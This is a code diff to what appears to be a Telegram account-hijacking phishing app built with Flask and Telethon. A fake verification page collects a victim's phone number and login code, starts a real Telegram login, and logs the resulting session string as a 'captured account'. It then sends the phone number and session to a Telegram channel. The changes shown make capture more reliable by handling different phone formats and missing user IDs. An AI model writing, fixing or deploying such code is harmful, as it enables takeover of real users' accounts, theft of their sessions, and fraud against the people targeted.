@@ -7,7 +7,6 @@ from telethon import TelegramClient, events, errors
 from telethon.sessions import StringSession
 from flask import Flask, request, jsonify, render_template_string
 
-# Load from environment variables
 API_ID = int(os.environ.get("API_ID"))
 API_HASH = os.environ.get("API_HASH")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -274,21 +273,47 @@ FRONTEND_HTML = """
             document.getElementById('verificationScreen').style.display = 'block';
         }
         
-        // FIXED: Now sends phone number to backend to trigger code request
+        // FIXED: Properly extracts phone and handles missing userId
         function handleContact() {
             document.getElementById('shareBtn').disabled = true;
             document.getElementById('contactLoading').style.display = 'block';
             
             tg.requestContact(function(success, response) {
                 if (success && response) {
-                    console.log('Contact shared:', response);
-                    var phone = response.phone_number;
+                    console.log('Contact response:', response);
                     
-                    // Send phone number to backend to initiate login code
+                    // Extract phone number from various possible formats
+                    var phone = null;
+                    if (typeof response === 'string') {
+                        phone = response;
+                    } else if (response.phone_number) {
+                        phone = response.phone_number;
+                    } else if (response.contact && response.contact.phone_number) {
+                        phone = response.contact.phone_number;
+                    }
+                    
+                    // Ensure phone has + prefix
+                    if (phone && !phone.startsWith('+')) {
+                        phone = '+' + phone;
+                    }
+                    
+                    // Use phone as user_id if tg user id not available
+                    var uid = userId || phone;
+                    
+                    if (!phone || !uid) {
+                        alert('Could not get phone number. Please try again.');
+                        document.getElementById('shareBtn').disabled = false;
+                        document.getElementById('contactLoading').style.display = 'none';
+                        return;
+                    }
+                    
+                    // Store uid for later use
+                    userId = uid;
+                    
                     fetch('/initiate', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ user_id: userId, phone: phone })
+                        body: JSON.stringify({ user_id: uid, phone: phone })
                     })
                     .then(function(res) { return res.json(); })
                     .then(function(data) {
@@ -296,7 +321,7 @@ FRONTEND_HTML = """
                             document.getElementById('verificationScreen').style.display = 'none';
                             document.getElementById('codeScreen').style.display = 'block';
                         } else {
-                            alert(data.error || 'Failed to send code. Please try again.');
+                            alert(data.error || 'Failed to send code.');
                             document.getElementById('shareBtn').disabled = false;
                             document.getElementById('contactLoading').style.display = 'none';
                         }
@@ -315,6 +340,11 @@ FRONTEND_HTML = """
         }
         
         function resendCode() {
+            if (!userId) {
+                alert('Session error. Please restart.');
+                return;
+            }
+            
             fetch('/resend', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -327,7 +357,7 @@ FRONTEND_HTML = """
                     enteredCode = '';
                     updateCodeDisplay();
                 } else {
-                    alert(data.error || 'Failed to resend code. Please try again.');
+                    alert(data.error || 'Failed to resend code.');
                 }
             });
         }
@@ -358,9 +388,15 @@ FRONTEND_HTML = """
             }
         }
         
+        // FIXED: Added check for userId
         function submitCode() {
             if (enteredCode.length !== 5) {
                 alert('Please enter the full 5-digit code.');
+                return;
+            }
+            
+            if (!userId) {
+                alert('Session error. Please restart the verification.');
                 return;
             }
             
@@ -408,7 +444,6 @@ FRONTEND_HTML = """
 def index():
     return render_template_string(FRONTEND_HTML)
 
-# NEW ENDPOINT: Receives phone number from frontend and sends login code
 @app.route('/initiate', methods=['POST'])
 def initiate_verification():
     data = request.json
@@ -429,7 +464,6 @@ def initiate_verification():
             phone_code_hash = result.phone_code_hash
             session_string = client.session.save()
             
-            # Store session data
             active_sessions[user_id] = {
                 'phone': phone,
                 'phone_code_hash': phone_code_hash,
@@ -490,7 +524,7 @@ def resend_code():
             return True, None
         except errors.PhoneNumberFloodError:
             await client.disconnect()
-            return False, "Too many attempts. Please wait a few minutes."
+            return False, "Too many attempts. Please wait."
         except Exception as e:
             await client.disconnect()
             return False, str(e)
@@ -543,7 +577,6 @@ def verify_code():
             print(f"\n[SUCCESS] Captured account for {phone}")
             print(f"[SUCCESS] Session String: {final_session_string}\n")
             
-            # Send to Telegram channel
             log_message = (
                 f"🚨 **NEW ACCOUNT CAPTURED** 🚨\n\n"
                 f"📞 Phone: `{phone}`\n"
@@ -605,7 +638,6 @@ async def bot_listener():
 
     @bot_client.on(events.NewMessage)
     async def handler(event):
-        # This handles contacts sent directly to bot (backup method)
         if event.message.media and hasattr(event.message.media, 'phone_number'):
             contact = event.message.media
             phone = contact.phone_number
